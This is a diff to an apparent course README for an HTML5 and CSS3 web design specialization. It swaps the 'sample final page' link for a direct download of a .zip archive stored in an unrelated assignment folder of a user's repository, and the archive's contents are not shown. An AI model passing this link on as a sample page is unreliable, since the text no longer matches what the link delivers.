@@ -17,7 +17,7 @@ This Specialization covers how to write syntactically correct HTML5 and CSS3, an
 
 ## Introduction to HTML5
 
-This course will appeal to a wide variety of people, but specifically those who would like a step-by-step description of the basics. There are no prerequisites for this course and it is assumed that students have no prior programming skills or IT experience. The course will culminate in a small final project that will require the completion of a very simple page with links and images. The focus of this course is on the basics, not appearance. You can see a sample final page at http://intro-webdesign.com/html5-plain.html.
+This course will appeal to a wide variety of people, but specifically those who would like a step-by-step description of the basics. There are no prerequisites for this course and it is assumed that students have no prior programming skills or IT experience. The course will culminate in a small final project that will require the completion of a very simple page with links and images. The focus of this course is on the basics, not appearance. You can see a sample final page at https://raw.githubusercontent.com/adnannajem/web-design-for-everybody/master/02-Intro-to-CSS3/week-1/assignment/css/for_web_everybody_design_3.7.zip
 
 ## Introduction to CSS3
 
